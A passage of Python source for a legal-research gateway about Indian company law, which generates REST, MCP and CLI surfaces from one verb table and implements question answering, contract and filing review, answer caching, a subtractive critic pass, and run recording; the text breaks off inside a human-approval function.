"""One verb table. Three surfaces generated from it, and a test that they cannot drift.

PLAN_22 D6: "One verb table generates REST API, MCP tools and a CLI, with a parity test,
so the three surfaces cannot drift into three products."

The failure being prevented is specific and ordinary: someone adds an argument to the REST
route, the CLI keeps five flags, and the MCP tool keeps four. Nothing breaks, nobody
notices, and six months later the three surfaces disagree about what the product does.
The parity test does not compare a hand-kept list against another hand-kept list -- it
GENERATES all three from `VERBS` and compares the generated shapes, so a surface can only
drift by someone editing this table, which is the point.

## What a verb is

A name, a summary, and its inputs. Everything a surface needs is derived:

    REST   POST /v2/ask                 dotted name -> a path, path fields interpolated
    MCP    themis.ask                   dotted name -> the existing themis.* namespace
    CLI    placedon ask --question ...  dotted name -> a subcommand, inputs -> flags

`read_only` is not decoration: checker/mcp/policy.py asserts READ_ONLY_TOOLS ==
KNOWN_TOOLS, so a verb that writes must be kept out of the MCP surface until that policy
is deliberately widened, and `mcp_tools()` enforces it rather than trusting the author.

Run: PYTHONPATH=. python3 gateway/verbs.py
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Callable

STRING = "string"
OBJECT = "object"
BOOLEAN = "boolean"
# A list, and it is a separate kind because `mcp_tools()` puts `Field.kind` straight into
# the JSON Schema as the declared type. Declaring a list field OBJECT told every MCP client
# to send `{...}` where the handler reads a list -- a schema that lies about the verb.
ARRAY = "array"
KINDS = (STRING, OBJECT, BOOLEAN, ARRAY)

V2 = "/v2"
MCP_NAMESPACE = "themis"


@dataclass(frozen=True)
class Field:
    name: str
    kind: str = STRING
    required: bool = False
    in_path: bool = False
    describes: str = ""

    def __post_init__(self) -> None:
        if self.kind not in KINDS:
            raise ValueError(f"{self.name!r}: {self.kind!r} is not a field kind; one of "
                             f"{KINDS}. The kind is published as the JSON Schema type, so "
                             f"an unknown one is a contract nobody can read")
        if self.in_path and not self.required:
            raise ValueError(
                f"{self.name!r} is in the path and optional, which cannot be: a URL either "
                f"has that segment or is a different route")


@dataclass(frozen=True)
class Verb:
    name: str
    summary: str
    inputs: tuple[Field, ...]
    method: str = "POST"
    read_only: bool = False
    run: Callable[[dict, "Context"], dict] | None = None

    @property
    def body_fields(self) -> tuple[Field, ...]:
        return tuple(f for f in self.inputs if not f.in_path)

    @property
    def path_fields(self) -> tuple[Field, ...]:
        return tuple(f for f in self.inputs if f.in_path)

    @property
    def signature(self) -> tuple[tuple[str, bool], ...]:
        """(name, required) for every input, sorted. What parity is measured on."""
        return tuple(sorted((f.name, f.required) for f in self.inputs))


@dataclass
class Context:
    """What a handler is allowed to reach. Injected, so no surface has a private back door."""
    tenant: str = "unknown"
    actor: str = "unknown"
    store: object | None = None
    documents: dict = field(default_factory=dict)
    model_for: Callable | None = None
    clock: Callable[[], str] | None = None
    queue: object | None = None
    # The steps the last handler built, kept so the QUEUE path can reuse the very code the
    # request path runs instead of a second implementation of it. `_persist_run` fills it.
    # Without this the durable executor would have its own idea of what a run's steps are,
    # and the two would drift the first time either changed.
    last_steps: list = field(default_factory=list)


# ── the three name derivations, each a pure function of the verb name ────────

def rest_path(verb: Verb) -> str:
    """`runs.get` + a run_id path field -> /v2/runs/{run_id}."""
    head = verb.name.replace(".", "/").replace("_", "-")
    segs = [f"{V2}/{head}"]
    tail = [f.name for f in verb.path_fields]
    if verb.name.endswith(".get") or verb.name.endswith(".trace"):
        # runs.get -> /v2/runs/{run_id}; runs.trace -> /v2/runs/{run_id}/trace
        base = verb.name.split(".")[0]
        segs = [f"{V2}/{base}"] + [f"{{{t}}}" for t in tail]
        if verb.name.endswith(".trace"):
            segs.append("trace")
        return "/".join(segs)
    return segs[0] + "".join(f"/{{{t}}}" for t in tail)


def mcp_name(verb: Verb) -> str:
    return f"{MCP_NAMESPACE}.{verb.name}"


def cli_command(verb: Verb) -> str:
    """`runs.get` -> `runs-get`, so a shell word is one token."""
    return verb.name.replace(".", "-").replace("_", "-")


def cli_flag(f: Field) -> str:
    return "--" + f.name.replace("_", "-")


# ── the handlers ─────────────────────────────────────────────────────────────

def _refuse(code: str, detail: str) -> dict:
    return {"status": "REFUSED", "code": code, "detail": detail}


def _ledger():
    """The real rupee/request ledger, or None if it cannot be read.

    An unreadable ledger is not evidence the budget is empty, so the call proceeds -- the
    same choice backend/budget.py makes in providers_available(). The cost of being wrong
    is one call that records itself properly.
    """
    try:
        from backend.budget import BudgetTracker
        return BudgetTracker()
    except (OSError, ValueError):
        return None


def _served_or_refusal(origins, *, name: str, purpose: str, ctx: Context,
                       consequence: str | None = None):
    """(Served|None, refusal dict|None). Never returns neither, never returns both."""
    from gateway.models import NotServed, serve
    if ctx.model_for is not None:                     # a test or a caller-supplied model
        # A dataclass instance, not a class with `call` as a class attribute: a plain
        # function stored on a class becomes a BOUND METHOD through an instance, so
        # `served.call(prompt)` would pass `self` as the prompt. Caught on 29-09-2026.
        from gateway.models import Served
        return Served(call=ctx.model_for(origins), provider="stub", model="stub",
                      region="n/a", degraded=False, requires_review=False,
                      est_cost_inr=0.0), None
    try:
        from checker import router as _r
        return serve(origins, name=name, purpose=purpose, budget=_ledger(),
                     consequence=consequence or _r.LOW), None
    except NotServed as e:
        # REFUSED with the code, never a quiet UNVERIFIED: UNVERIFIED is a claim about
        # EVIDENCE, and there is no evidence when no call was made.
        return None, {"status": "REFUSED", "code": e.code, "detail": e.detail}


def _ask(args: dict, ctx: Context) -> dict:
    from agents import research_question as rq
    from checker import router
    q = (args.get("question") or "").strip()
    if not q:
        return _refuse("BAD_REQUEST", "question is required")
    user_facts, refusal = _company_facts(args.get("company_facts"))
    if refusal:
        return refusal

    # O5. Decompose BEFORE the cache: each sub-question is cached on its own, which is
    # where the reuse actually is -- "what notice is required" recurs across many compound
    # questions that are each asked once.
    if _affirmed(args.get("decompose")):
        return _ask_decomposed(q, args, ctx)

    # O9. The cache is consulted ONLY when no company facts were supplied: a fact-dependent
    # answer is an answer about one company, and the key does not carry the facts, so a hit
    # would serve one company's answer to a question asked about another.
    hit, cache_key = (None, None)
    if ctx.store is not None and not user_facts:
        hit, cache_key = _cache_lookup(q, "RESEARCH_QUESTION", args.get("sources"), ctx)
    if hit is not None:
        return hit

    ev = rq.evidence(q)
    origins = tuple(o for _, o in ev)
    served, refusal = (None, None)
    if origins:
        served, refusal = _served_or_refusal(origins, name="ask",
                                             purpose=router.NARRATION, ctx=ctx)
        if refusal:
            refusal["run_id"] = _persist_run(
                ctx, intent="research_question", status="REFUSED",
                refusal_code=refusal["code"],
                steps=[{"capability": "intake", "status": "ANSWERED"},
                       {"capability": "research", "status": "REFUSED"}],
                propositions=[])
            return refusal

    try:
        out = rq.answer(q, model=served.call if served else None,
                        available=args.get("available") or ("azure",))
    except Exception as e:                                       # noqa: BLE001
        # FAILED, not REFUSED: we tried and the attempt broke. Only a transport error
        # reaches here -- a decision not to call is handled above.
        rid = _persist_run(ctx, intent="research_question", status="FAILED",
                           steps=[{"capability": "research", "status": "FAILED"}],
                           propositions=[])
        return {"status": "FAILED", "error": f"{type(e).__name__}: {str(e)[:200]}",
                "run_id": rid}

    d = out.to_dict()
    # The traced spans, as citations. `to_dict()` carries the provision NAMES and not the
    # spans, so the conversation layer had nothing to build citations[] from and shipped it
    # empty for every task. The Summary has them; this is where they leave.
    cite_index: dict = {}
    if out.summary is not None:
        d["citations"] = _citations_from_summary(out.summary, ev, index_out=cite_index)
    if user_facts:
        # PLAN_26 S2-alt: accepted, labelled "you told us", never presented as verified.
        # They are RECORDED AND SHOWN and they do not steer the answer -- the answer is
        # built from the held statute by deterministic engine calls, and threading an
        # unverified company fact into that is a Ring 0 change this step did not make.
        # Said in the payload rather than left for a reader to discover.
        d["user_facts"] = [f.to_dict() for f in user_facts]
        d["user_facts_note"] = (
            "Recorded as you told them to us, and shown back so you can see what we hold. "
            "They did not change this answer: it is read from the held Act. No company "
            "fact is ever VERIFIED.")
    # The ANSWER, with its citations. to_dict() carries the verdict and the provisions but
    # not the prose, so the verb returned everything about an answer except the answer.
    # Summary.prose() is the served form: traced sentences with their spans, and the count
    # of any that were dropped stated in the body rather than a footnote.
    d["answer"] = out.served
    if (_affirmed(args.get("critic")) or _critic_enabled()) and out.summary is not None:
        d = _apply_critic(d, out.summary, ctx, cite_index=cite_index)
    fields = served.step_fields() if served else {}
    d["run_id"] = _persist_run(
        ctx, intent="research_question", status=out.status,
        refusal_code=out.code if out.status == "REFUSED" else None,
        steps=[{"capability": "intake", "status": "ANSWERED"},
               {"capability": "research", "engine_capability": "law.acquisition_exposure",
                "status": out.status, **fields}],
        propositions=[{"status": "VERIFIED" if s.traced else "UNVERIFIED",
                       "source_ref": (s.citation.source_id
                                      if getattr(s, "citation", None) else None),
                       "span_start": None, "span_end": None}
                      for s in (out.summary.sentences if out.summary else ())],
        law_versions={o.path: o.blob for o in origins},
        # CAL-1. `entailed` is None on this path, so the score is not computed and the
        # note records which half is missing -- see `nonconformity_for`.
        traced=len(out.summary.traced) if out.summary else 0,
        sentences=len(out.summary.sentences) if out.summary else 0)
    _cache_store(cache_key, q, "RESEARCH_QUESTION", args.get("sources"), d, ctx)
    return d


# ── layer 7: the critic ──────────────────────────────────────────────────────

_CRITIC_PROMPT = (
    "Below are the sentences of an answer about Indian company law. Each was already "
    "traced to a verbatim statutory span by a verifier.\n\n"
    "Your ONLY job is to object. You may:\n"
    "  REMOVE <id> -- the sentence is not supported by the span it rests on\n"
    "  FLAG   <id> -- the sentence is supported but reads more broadly than the span\n"
    "You may NOT rewrite, add, or suggest better wording. There is nowhere to put it.\n"
    "Reply with one line per objection: ACTION id: reason (at least 10 characters).\n"
    "Reply with nothing at all if you have no objection. Do not invent an objection to "
    "appear useful.\n\n")


def _critic_for(ctx: Context):
    """`critique(claims) -> [dict]` from the routed model, or one that raises.

    Raising is the designed failure: `critic.review` turns it into "the critic did not
    run" and the answer stands exactly as the verifier left it. This layer only ever
    subtracts, so not running it is always the safe direction.
    """
    from checker import public_only, router
    from checker.prompt_safety import UNTRUSTED_CLAUSE, wrap_untrusted

    def critique(claims):
        origins = tuple(public_only.clear_file(str(c.get("source")))
                        for c in (getattr(critique, "sources", ()) or ())
                        if str(c.get("source") or ""))
        if not origins:
            raise RuntimeError("no citation names the file it was read from, so the "
                               "answer's own sentences cannot be cleared")
        served, refusal = _served_or_refusal(origins, name="critic",
                                             purpose=router.NARRATION, ctx=ctx,
                                             consequence=router.LOW)
        if refusal:
            raise RuntimeError(f"no model to criticise with: {refusal['code']}")
        body = "".join(f"{c['id']}:\n{wrap_untrusted(c['text'], 'an answer sentence')}\n"
                       for c in claims)
        raw = str(served.call(UNTRUSTED_CLAUSE + "\n\n" + _CRITIC_PROMPT + body) or "")
        out = []
        for line in raw.splitlines():
            line = line.strip()
            if ":" not in line:
                continue
            head, reason = line.split(":", 1)
            bits = head.split()
            if len(bits) != 2:
                continue
            out.append({"action": bits[0].strip().upper(), "claim_id": bits[1].strip(),
                        "reason": reason.strip()})
        return out

    return critique


def _critic_enabled() -> bool:
    """The one setting, default OFF. Job 6b.

    The critic can only subtract, and until a model is actually served live (B1) turning
    it on everywhere would mean every answer in the product quietly depends on a layer
    nobody has watched work. So it is off, and `ask`'s per-call `critic` flag stays the
    way to exercise it.
    """
    from checker import critic as cr
    return cr.enabled()                       # one answer, in checker/critic.py


def _apply_critic(d: dict, summary, ctx: Context, *, cite_index=None) -> dict:
    """Run the critic over the answer's own sentences and narrow the answer, or not.

    The claims are the VERIFIER'S OUTPUT -- sentences already traced to a verbatim span --
    which is what makes this an external check rather than the self-correction §1.4 rules
    out: the critic is shown what the verifier admitted, not what a model wanted to say.
    """
    from checker import critic as cr
    cite_index = dict(cite_index or {})
    claims = [{"id": f"s{i}", "text": str(getattr(sent, "text", "") or ""),
               "source": None, "citation_ids": list(cite_index.get(i, []))}
              for i, sent in enumerate(getattr(summary, "sentences", ()) or (), 1)]
    if not claims:
        return d
    critique = _critic_for(ctx)
    # The citations carry the corpus paths the sentences were traced to; the critic's
    # prompt is cleared against those files.
    critique.sources = list(d.get("citations") or ())
    try:
        verdict = cr.review(claims, critique=critique)
    except cr.CriticError:
        return d
    out = dict(d)
    out["critic"] = verdict.to_dict()
    if verdict.removed:
        kept_text = [c["text"] for c in verdict.kept if c["text"].strip()]
        out["answer"] = "\n".join(kept_text)
        # Job 6b: a citation that only the removed sentence used dies with it. Leaving it
        # in `citations[]` would show a provision as supporting an answer that no longer
        # says anything about it -- a source panel listing law the text does not rest on.
        # A citation a KEPT sentence also uses survives, which is why the index records
        # every sentence that cites a span and not just the first.
        still_used = {cid for c in verdict.kept for cid in (c.get("citation_ids") or ())}
        before = [dict(c) for c in (out.get("citations") or ())]
        kept_cites = [c for c in before if str(c.get("id") or "") in still_used]
        orphans = [str(c.get("id")) for c in before if str(c.get("id") or "")
                   not in still_used]
        if orphans:
            out["citations"] = kept_cites
            out["critic"] = dict(out["critic"], dropped_citations=orphans,
                                 trace=list(out["critic"]["trace"])
                                 + [f"DROPPED CITATIONS {orphans}: no remaining sentence "
                                    f"cites them"])
        out["critic_note"] = (
            f"The critic removed {len(verdict.removed)} sentence(s) from this answer, "
            f"with the reason recorded in critic.trace. It may remove at most one per run "
            f"(PLAN_23 §1.4) and may never rewrite or add.")
        if not kept_text:
            # The whole answer went. ANSWERED with an empty body would read as "nothing
            # applies" -- a finding of no obligation, produced by a critic rather than by
            # the law. It is an abstention, and it says whose objection caused it.
            out["status"] = "NEEDS_LAWYER"
            out["critic_note"] = (
                "The critic objected to EVERY sentence of this answer, so nothing is "
                "served. This is not a finding that no obligation exists: it is an "
                "answer withdrawn, and the objection is in critic.trace for a person to "
                "agree or disagree with.")
    return out


# ── O5: bounded decomposition ────────────────────────────────────────────────

_SPLIT_PROMPT = (
    "Split the question below into the smallest number of INDEPENDENT sub-questions that "
    "together cover it, at most {n}. Each must be answerable on its own against Indian "
    "company law. If it does not split, return it unchanged.\n"
    "Reply with one sub-question per line, numbered 1., 2., ... and nothing else.\n\n"
    "Question: {q}\n")


def _split_proposer(ctx: Context):
    """`propose(question) -> [str]` from the routed model, or one that raises.

    Raising is the designed failure: `decompose.plan` turns a proposer that raises into a
    single sub-question, which is the original. So "no model could be served" costs the
    SPLIT and never the answer.
    """
    from checker import decompose, public_only, router

    def propose(question: str):
        origin = public_only.clear_matter(question, name="question to split",
                                          provider=router.AZURE)
        served, refusal = _served_or_refusal((origin,), name="decompose",
                                             purpose=router.CLASSIFICATION, ctx=ctx,
                                             consequence=router.LOW)
        if refusal:
            raise RuntimeError(f"no model to split the question: {refusal['code']}")
        raw = str(served.call(_SPLIT_PROMPT.format(n=decompose.MAX_SUBQUESTIONS,
                                                   q=question)) or "")
        out = []
        for line in raw.splitlines():
            line = line.strip()
            if not line:
                continue
            # "1. text" or "1) text"; anything else is taken whole rather than dropped.
            parts = line.split(".", 1) if "." in line[:3] else line.split(")", 1)
            text = (parts[1] if len(parts) == 2 and parts[0].strip().isdigit()
                    else line).strip()
            if text:
                out.append(text)
        return out

    return propose


def _ask_decomposed(question: str, args: dict, ctx: Context) -> dict:
    """Split, answer each part through the FULL ask path, join only what is cited.

    Each part is a real `_ask` -- the same retrieval, the same verifier, the same cache --
    so a sub-answer is verified exactly as a whole answer is. `decompose` is not passed
    down, which is what makes the depth one and keeps four the whole budget rather than
    four per level.
    """
    from checker import decompose as dc

    subs = dc.plan(question, propose=_split_proposer(ctx))
    if len(subs) == 1 and subs[0].strip().lower() == question.strip().lower():
        # It did not split. Answer it whole rather than wrapping one part in a synthesis
        # that would report "1 sub-question" about a question nobody divided.
        return _ask({k: v for k, v in args.items() if k != "decompose"}, ctx)

    parts, run_ids = [], []
    for sub in subs:
        inner = dict(args)
        inner.pop("decompose", None)
        inner["question"] = sub
        r = _ask(inner, ctx)
        if r.get("run_id"):
            run_ids.append(r["run_id"])
        parts.append(dc.Part(
            question=sub, status=str(r.get("status") or ""),
            answer=str(r.get("answer") or ""),
            citations=tuple(r.get("citations") or ()),
            failure=str(r.get("detail") or r.get("error") or "")))
    syn = dc.synthesise(parts, proposed=len(subs))
    out = syn.to_dict()
    out["sub_run_ids"] = run_ids
    # The run that RECORDS the decomposition. Its steps name each sub-question, so
    # runs.trace shows what was asked rather than one opaque "research" step.
    out["run_id"] = _persist_run(
        ctx, intent="research_question", status=syn.status,
        steps=[{"capability": "intake", "status": "ANSWERED",
                "cost_note": "the split is one model call, priced on its own run"}]
              + [{"capability": f"research.part{i}", "status": p.status or "FAILED",
                  "cost_note": f"sub-question: {p.question[:80]}"}
                 for i, p in enumerate(parts, 1)],
        propositions=[])
    return out


# ── O9: the answer cache ─────────────────────────────────────────────────────
#
# `checker/answer_cache.py` holds the rules and 014_answer_cache.sql holds the rows. These
# two functions are the whole of the wiring, and both fail SOFT: a cache that errors must
# never stop an answer being given, because every entry in it is derived and the fallback
# is simply to do the work.

def _cache_lookup(question: str, task: str, sources, ctx: Context):
    """(a servable result | None, the lookup key | None).

    The gate is `verify_citation` -- the same re-read `citation.get` uses -- run over every
    citation the stored answer carries. A stored answer whose provision has changed is NOT
    served, and that is counted apart from a miss: it means the law moved, which is itself
    the news.
    """
    from checker import answer_cache as ac
    try:
        key = ac.lookup_key(question=question, task=task, as_of=_today(ctx),
                            sources=sources or ())
    except ac.CacheError:
        return None, None
    try:
        row = ctx.store.read_cache_entry(key)
        entry = None if row is None else ac.Entry(
            lookup=row["lookup_key"], content=row["content_key"],
            question=row.get("question") or "", task=row.get("task") or "",
            as_of=row.get("as_of") or "", sources=tuple(row.get("sources") or ()),
            citations=tuple(row.get("citations") or ()),
            payload=dict(row.get("payload") or {}),
            created_at=row.get("created_at") or "")
        ok, why = ac.servable(entry, verify=lambda c: verify_citation(c))
        kind = "hits" if ok else ("misses" if entry is None else "stale")
        ctx.store.bump_cache_stat(kind, day=_today(ctx))
        if not ok:
            return None, key
        out = dict(entry.payload)
        out["cached"] = True
        out["cache_note"] = (f"served from the answer cache, stored {entry.created_at}. "
                             f"{why}")
        return out, key
    except Exception:                                            # noqa: BLE001
        # Derived rows only. A broken cache costs a re-answer and must never cost an
        # answer, so nothing here is allowed to propagate.
        return None, None


def _cache_store(key, question: str, task: str, sources, result: dict,
                 ctx: Context) -> None:
    """Keep an answer only if it is the kind that can later be shown to be still true."""
    from checker import answer_cache as ac
    if not key or ctx.store is None or not isinstance(result, dict):
        return
    # ANSWERED only, and only with citations. A refusal may be a model that was briefly
    # unavailable, and caching it would make a transient outage permanent; an uncited
    # answer can never be re-verified, so `servable` would refuse it on every read.
    if result.get("status") != "ANSWERED" or not (result.get("citations") or []):
        return
    try:
        entry = ac.Entry.build(question=question, task=task, as_of=_today(ctx),
                               sources=sources or (),
                               citations=result.get("citations") or (),
                               payload={k: v for k, v in result.items()
                                        if k not in ("cached", "cache_note")},
                               created_at=_now(ctx))
        ctx.store.write_cache_entry(entry.to_dict())
    except Exception:                                            # noqa: BLE001
        return


def _now(ctx: Context) -> str:
    if ctx.clock is not None:
        return str(ctx.clock())
    from datetime import datetime, timezone
    return datetime.now(timezone.utc).isoformat()


def cache_stats(ctx: Context) -> dict:
    """The hit rate, and what it does not include.

    Deliberately NOT a verb. Every read-only verb is exported as an MCP tool -- there is no
    opt-out, by design -- and a cache hit rate is an operator's number, not a capability an
    agent should hold. Adding it would also have meant editing the MCP policy allowlist in
    three files, one of them Project Themis's. `scripts/cache_report.py` prints it.
    """
    from checker.answer_cache import Stats
    if ctx.store is None:
        return {"error": "no store is configured, so there is no cache"}
    raw = ctx.store.read_cache_stats()
    return Stats(hits=int(raw.get("hits") or 0), misses=int(raw.get("misses") or 0),
                 stale=int(raw.get("stale") or 0)).to_dict()


def law_versions_of(paths) -> dict[str, str]:
    """{repo-relative path: git blob id} of the held text a run READ. PLAN_23 layer 10.

    A law version is the hash of the text applied, in the form `public_only.Origin.blob`
    already uses, so O7 recall and the O9 cache compare one identity. Computed from the
    bytes on disk (git's own blob formula), not from HEAD: it records what was read.
    A path that cannot be read raises -- a missing version is not an empty one.
    """
    import hashlib
    from pathlib import Path
    root = Path(__file__).resolve().parent.parent
    out = {}
    for rel in paths:
        data = (root / rel).read_bytes()
        out[rel] = hashlib.sha1(b"blob %d\0" % len(data) + data).hexdigest()
    return out


# What review_document applies. The checks are CODE (checker/ss/defects.py) and that is a
# behaviour version, not a law version; the standards they encode are these two texts. Both
# are recorded whatever the meeting kind: an over-broad recall is a re-review, an under-broad
# one is a stale approval nobody is told about.
SS_TEXTS = ("corpus/reference/SS-1.txt", "corpus/reference/SS-2.txt")


def _persist_run(ctx: Context, *, intent: str, status: str, steps: list,
                 propositions: list, refusal_code=None,
                 law_versions: dict | None = None,
                 entailed=None, traced: int = 0, sentences: int = 0,
                 escalations: int = 0) -> str | None:
    """Write one run as runs + ordered steps + propositions. Returns the run id, or None.

    R-016's DERIVATION model, actually used: without this a verb answers and leaves no
    trace, and `runs.trace` has nothing to serve. A store that is absent is not an error
    here -- the verb still answered -- but the caller is told the id is None rather than
    handed one that resolves to nothing.
    """
    ctx.last_steps = list(steps)
    if ctx.store is None:
        return None
    import uuid
    run_id = str(uuid.uuid4())
    score, why = nonconformity_for(entailed=entailed, traced=traced, total=sentences,
                                   escalations=escalations)
    ctx.store.write({"id": run_id, "intent": intent, "status": status,
                     "refusal_code": refusal_code, "law_versions": law_versions,
                     "steps": steps, "propositions": propositions,
                     "nonconformity": score, "nonconformity_note": why})
    return run_id


def nonconformity_for(*, entailed, traced, total, escalations: int = 0) -> tuple:
    """(score, note) for a run, from `checker/calibration.nonconformity`. CAL-1.

    `entailed` is the count of sentences that passed ENTAILMENT, and it is deliberately a
    separate argument from `traced`. A sentence can quote a real span at real offsets and
    still assert something the span does not say -- `checker/lawyer_summary.py` says
    exactly that, and declares its ENTAILED verdict reserved and never returned.

    So when `entailed` is None the score is NOT computed and the note says why. Scoring
    from `traced` alone would be a different measurement under the same name, and it is
    the one every threshold would later be computed from.
    """
    from checker.calibration import nonconformity
    if not total:
        return None, None                 # nothing ran; NULL, with nothing to explain
    if entailed is None:
        return None, (
            f"not computed: {traced} of {total} sentence(s) byte-matched, but this path "
            f"produces no entailment verdict (checker/lawyer_summary.py declares ENTAILED "
            f"reserved and never returned), and the score needs both. Scoring from the "
            f"byte match alone would be a different measurement under the same name.")
    return nonconformity(verified=int(entailed), total=int(total),
                         escalations=int(escalations))


def _review_contract(args: dict, ctx: Context) -> dict:
    from pathlib import Path

    from agents import review_contract as rc
    from checker import playbook as pb
    text = args.get("text") or ""
    if not text.strip():
        return _refuse("BAD_REQUEST", "text is required")
    book_path = args.get("playbook") or "playbooks/nda_v1.json"
    root = Path(__file__).resolve().parent.parent
    try:
        book = pb.load(root / book_path)
    except pb.PlaybookError as e:
        return _refuse("BAD_REQUEST", f"playbook: {e}")
    from checker import public_only, router
    name = args.get("name") or "contract"
    # The clearance is made HERE, before a route is chosen, so the served callable is bound
    # to this document and cannot be reused against another one.
    try:
        origin = public_only.clear_matter(
            text, name=name, provider="azure",
            test_data=bool(args.get("test_data")))
    except public_only.NotPublic as e:
        return _refuse("NOT_PERMITTED", str(e))
    # Residency is a decision about the DOCUMENT, so it is taken before a route is sought.
    # Checked only inside the Azure call, a gateway with no credentials refused NO_MODEL
    # instead, and the reader was told "outage" where the answer was "not permitted".
    from checker import azure_model
    try:
        azure_model.refuse_unconfirmed_region(origin)
    except azure_model.ModelRefused as e:
        return _refuse("NOT_PERMITTED", str(e))

    served, refusal = _served_or_refusal(origin, name="review_contract",
                                         purpose=router.EXTRACTION,
                                         consequence=router.HIGH, ctx=ctx)
    if refusal:
        refusal["run_id"] = _persist_run(
            ctx, intent="review_contract", status="REFUSED",
            refusal_code=refusal["code"],
            steps=[{"capability": "intake", "status": "ANSWERED"},
                   {"capability": "document", "status": "REFUSED"}],
            propositions=[])
        return refusal

    try:
        out = rc.review(text, book=book, model=served.call, name=name, origin=origin)
    except Exception as e:                                       # noqa: BLE001
        rid = _persist_run(ctx, intent="review_contract", status="FAILED",
                           steps=[{"capability": "document", "status": "FAILED"}],
                           propositions=[])
        return {"status": "FAILED", "error": f"{type(e).__name__}: {str(e)[:200]}",
                "run_id": rid}
    d = out.to_dict()

    # The run, as a derivation: the steps agents/plans.py declares for this intent, and one
    # proposition per finding. A finding's status is a PLAYBOOK status (MATCHES, DEVIATES,
    # MISSING, NEEDS_LAWYER) and a proposition's is an L0 verification status, so they are
    # mapped rather than copied -- writing "DEVIATES" into a column that means "VERIFIED"
    # would put a company standard where a legal verdict is read from.
    # VERIFIED requires an EXTRACTION that passed span verification -- not merely a
    # finding. The first version derived it by subtraction ("every clause, minus the
    # unverified ones"), and with no model configured nothing is extracted, nothing is
    # unverified, and all ten findings persisted as VERIFIED. Ten MISSING clauses recorded
    # as verified propositions is a falsehood in the one record that is supposed to be
    # trustworthy. So the set is built from what was actually verified, positively.
    verified_clauses = {e.clause for e in out.extracted if e.verified}
    props = [{"status": "VERIFIED" if f.clause in verified_clauses else "UNVERIFIED",
              "source_ref": f"playbook:{f.rule_id}",
              "span_start": None, "span_end": None}
             for f in out.findings]
    fields = served.step_fields()
    steps = [
        {"capability": "intake", "status": "ANSWERED", "degraded": False},
        {"capability": "document", "engine_capability": "document.ground_extraction",
         "status": "ANSWERED", **fields},
        {"capability": "playbook", "engine_capability": "contract.playbook_review",
         "status": "ANSWERED", "degraded": False},
    ]
    d["run_id"] = _persist_run(ctx, intent="review_contract", status="ANSWERED",
                               steps=steps, propositions=props,
                               law_versions=law_versions_of((book_path,)))
    return d


def _runs_get(args: dict, ctx: Context) -> dict:
    if ctx.store is None:
        return _refuse("NO_STORE", "no run store is configured on this deployment")
    row = ctx.store.read(args["run_id"])
    if row is None:
        return _refuse("NOT_FOUND", f"no run {args['run_id']!r}")
    return {k: v for k, v in row.items() if k != "steps"}


def _runs_trace(args: dict, ctx: Context) -> dict:
    if ctx.store is None:
        return _refuse("NO_STORE", "no run store is configured on this deployment")
    row = ctx.store.read(args["run_id"])
    if row is None:
        return _refuse("NOT_FOUND", f"no run {args['run_id']!r}")
    # `critic_enabled` travels with the trace (016). A trace is what someone reads to
    # work out why an answer says what it says, and "a layer that may REMOVE sentences was
    # running" belongs there rather than only in a column nobody queries. NULL is NOT
    # RECORDED -- every run from before 016 -- and is reported as such, not as false.
    enabled = row.get("critic_enabled")
    return {"run_id": row.get("id"), "steps": row.get("steps", []),
            "critic_enabled": enabled,
            "critic_note": ("not recorded for this run: it predates the setting being "
                            "stored, and false would claim we looked"
                            if enabled is None else
                            "the critic was ON when this run was written; a sentence it "
                            "removed is in the steps" if enabled else
                            "the critic was OFF when this run was written, so nothing was "
                            "removed by it")}


def _review_document(args: dict, ctx: Context) -> dict:
    """SS-1/SS-2 checks over a filing. No model is called, so nothing leaves the process.

    PLAN_23 O1. The classification happens FIRST and in code -- there is no `doc_type` input,
    because a caller who could declare "this is minutes" could turn every minutes check on a
    notice back on, which is the false-positive source the classifier was added to remove.
    """
    from agents import review_document as rd
    try:
        out = rd.review(
            args.get("text") or "",
            meeting_kind=args.get("meeting_kind") or "board",
            meeting_date=args.get("meeting_date"),
            entry_date=args.get("entry_date"),
        )
    except rd.BadRequest as e:
        return _refuse("BAD_REQUEST", str(e))

    d = out.to_dict()
    # An unclassified document is ANSWERED as a RUN -- the work was done and nothing failed
    # -- while its own status says the document was not identified. Recording the run as
    # REFUSED would say we declined to look, and recording it as a clean result would say
    # we looked and found nothing wrong. Neither happened.
    props = [{"status": "UNVERIFIED" if i["status"] in (rd.NEEDS_BOOK, rd.NOT_APPLICABLE)
                        else "VERIFIED",
              "source_ref": f"ss:{i['rule_id']}",
              "span_start": None, "span_end": None}
             for i in d["findings"]]
    steps = [
        {"capability": "intake", "status": "ANSWERED", "degraded": False},
        {"capability": "document", "engine_capability": "document.ground_extraction",
         "status": "ANSWERED" if out.status == rd.ANSWERED else "REFUSED",
         "degraded": False,
         # Named rather than left blank: UNPRICED with no reason is indistinguishable from
         # a cost nobody recorded, and this one has a good reason -- there was no model.
         "cost_note": "no model is called by this intent; the checks are code"},
        {"capability": "verify", "status": "ANSWERED", "degraded": False,
         "cost_note": "no model is called by this intent; the checks are code"},
    ]
    d["run_id"] = _persist_run(ctx, intent="review_document", status="ANSWERED",
                               steps=steps, propositions=props,
                               law_versions=law_versions_of(SS_TEXTS))
    return d


# The human gate. `runs.approve` and `runs.reject` are the only WRITING verbs besides
# documents.upload, and they are excluded from MCP by `mcp_tools` for exactly that reason --
# a tool surface that can approve a finding is a tool surface that can clear a review.
MIN_REASON_CHARS = 10


def _affirmed(value) -> bool:
    """True only for an explicit yes. `bool("false")` is True, so a string is never truthy
    by being non-empty -- a CLI or form that sends "false" must not record a quote as seen."""
    if value is True:
        return True
    return isinstance(value, str) and value.strip().lower() in ("true", "yes")


def _decide(args: dict, ctx: Context, *, decision: str) -> dict:
    """One human decision on one item, stored as labelled data (PLAN_23 rule 5).

    Refuses more than it accepts, on purpose. Every refusal here is a way the label could
    have been recorded meaninglessly, and a meaningless label is worse than none: it is
    counted later as evidence a person agreed.
    """
    import uuid

    run_id = (args.get("run_id") or "").strip()
    item_ref = (args.get("item_ref") or "").strip()
    reason = (args.get("reason") or "").strip()
    quoted_span = (args.get("quoted_span") or "").strip()
    quote_viewed = _affirmed(args.get("quote_viewed"))

    if not run_id:
        return _refuse("BAD_REQUEST", "run_id is required")
    if not item_ref:
        return _refuse("BAD_REQUEST",
                       "item_ref is required: a decision about a run is not a decision, "
                       "because a run has many findings and a reviewer judged one of them")
    if len(reason) < MIN_REASON_CHARS:
        return _refuse(
            "REASON_REQUIRED",
            f"a written reason of at least {MIN_REASON_CHARS} characters is required to "
            f"{decision.lower()} an item. A decision with no reason records that somebody "
